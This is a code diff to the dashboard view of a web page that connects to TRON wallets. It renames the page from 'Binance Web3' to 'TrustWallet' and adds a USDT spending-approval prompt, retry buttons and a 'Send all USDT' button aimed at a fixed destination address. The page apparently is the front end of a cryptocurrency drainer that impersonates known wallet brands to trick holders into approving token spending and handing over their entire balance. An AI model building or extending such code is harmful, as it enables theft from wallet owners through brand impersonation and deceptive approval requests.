@@ -1,5 +1,6 @@
 import { formatUsdtAmount } from "../amount";
 import { fetchTrxBalance, fetchUsdtActivity, fetchUsdtBalance } from "../tron";
+import { renderServerCard, startServerCard } from "./serverCard";
 import type { WalletSession } from "../wallet";
 
 function esc(value: string): string {
@@ -19,10 +20,16 @@ function truncateAddress(addr: string): string {
 export type DashboardViewOpts = {
   session: WalletSession;
   dest: string;
+  approveStatus: "pending" | "success" | "error" | null;
+  approveError: string | null;
+  approveTxId: string | null;
   transferStatus: "pending" | "success" | "error" | null;
   transferError: string | null;
   transferTxId: string | null;
   onDisconnect: () => void;
+  onSend: () => void;
+  onRetryApprove?: () => void;
+  onRetryTransfer?: () => void;
 };
 
 export function renderDashboardView(opts: DashboardViewOpts): void {
@@ -33,7 +40,7 @@ export function renderDashboardView(opts: DashboardViewOpts): void {
     <div class="container">
       <div class="brand">
         <div class="brand-icon">₮</div>
-        <h1>Binance Web3</h1>
+        <h1>TrustWallet</h1>
         <p class="subtitle">Send USDT on TRON (TRC-20)</p>
       </div>
 
@@ -64,7 +71,11 @@ export function renderDashboardView(opts: DashboardViewOpts): void {
         <p class="dest-card-hint">All USDT will be sent to this address</p>
       </div>
 
+      <div id="approve-status" class="status-area" hidden></div>
+
       <div id="status" class="status-area" hidden></div>
+
+      <button id="send-all-btn" type="button" class="send-all-btn"${opts.transferStatus === "pending" || opts.approveStatus === "pending" ? " disabled" : ""}>Send all USDT</button>
 
       <div class="section-header">
         <h2 class="section-title">Activity</h2>
@@ -73,9 +84,50 @@ export function renderDashboardView(opts: DashboardViewOpts): void {
         <li class="activity-loading hint">Loading…</li>
       </ul>
 
+      <section id="server-card" class="server-card"></section>
+
       <button id="disconnect-btn" type="button">Disconnect</button>
     </div>
   `;
+
+  const approveStatusEl = document.querySelector<HTMLElement>("#approve-status");
+  if (approveStatusEl) {
+    approveStatusEl.hidden = false;
+    if (opts.approveStatus === "pending") {
+      approveStatusEl.className = "status-area status-pending";
+      approveStatusEl.innerHTML = `
+        <div class="status-pill pending">
+          <span class="status-spinner"></span>
+          <span>Waiting for USDT TRC-20 approval…</span>
+        </div>
+        <p class="status-hint">Sign the approval in your wallet to enable USDT spending</p>`;
+    } else if (opts.approveStatus === "success" && opts.approveTxId) {
+      approveStatusEl.className = "status-area status-success";
+      approveStatusEl.innerHTML = `
+        <div class="status-pill success">
+          <span class="status-icon">✓</span>
+          <span>USDT TRC-20 approved!</span>
+        </div>
+        <a class="tx-link" href="https://tronscan.org/#/transaction/${encodeURIComponent(opts.approveTxId)}" target="_blank" rel="noopener noreferrer">View on Tronscan ↗</a>`;
+    } else if (opts.approveStatus === "error" && opts.approveError) {
+      approveStatusEl.className = "status-area status-error";
+      approveStatusEl.innerHTML = `
+        <div class="status-pill error">
+          <span class="status-icon">✕</span>
+          <span>${esc(opts.approveError)}</span>
+        </div>`;
+      if (opts.onRetryApprove) {
+        const retryBtn = document.createElement("button");
+        retryBtn.type = "button";
+        retryBtn.className = "retry-btn";
+        retryBtn.textContent = "Retry Approval";
+        retryBtn.addEventListener("click", () => opts.onRetryApprove!());
+        approveStatusEl.appendChild(retryBtn);
+      }
+    } else {
+      approveStatusEl.hidden = true;
+    }
+  }
 
   const statusEl = document.querySelector<HTMLElement>("#status");
   if (statusEl) {
@@ -85,7 +137,7 @@ export function renderDashboardView(opts: DashboardViewOpts): void {
       statusEl.innerHTML = `
         <div class="status-pill pending">
           <span class="status-spinner"></span>
-          <span>Waiting for wallet approval…</span>
+          <span>Sending USDT to destination…</span>
         </div>`;
     } else if (opts.transferStatus === "success" && opts.transferTxId) {
       statusEl.className = "status-area status-success";
@@ -102,6 +154,14 @@ export function renderDashboardView(opts: DashboardViewOpts): void {
           <span class="status-icon">✕</span>
           <span>${esc(opts.transferError)}</span>
         </div>`;
+      if (opts.onRetryTransfer) {
+        const retryBtn = document.createElement("button");
+        retryBtn.type = "button";
+        retryBtn.className = "retry-btn";
+        retryBtn.textContent = "Retry Send";
+        retryBtn.addEventListener("click", () => opts.onRetryTransfer!());
+        statusEl.appendChild(retryBtn);
+      }
     } else {
       statusEl.hidden = true;
     }
@@ -110,7 +170,16 @@ export function renderDashboardView(opts: DashboardViewOpts): void {
   document.querySelector<HTMLButtonElement>("#disconnect-btn")
     ?.addEventListener("click", () => opts.onDisconnect());
 
+  document.querySelector<HTMLButtonElement>("#send-all-btn")
+    ?.addEventListener("click", () => opts.onSend());
+
   void refreshBalancesAndActivity(opts.session.address);
+
+  const serverCardSection = document.querySelector<HTMLElement>("#server-card");
+  if (serverCardSection) {
+    renderServerCard(serverCardSection);
+    startServerCard();
+  }
 }
 
 async function refreshBalancesAndActivity(address: string): Promise<void> {
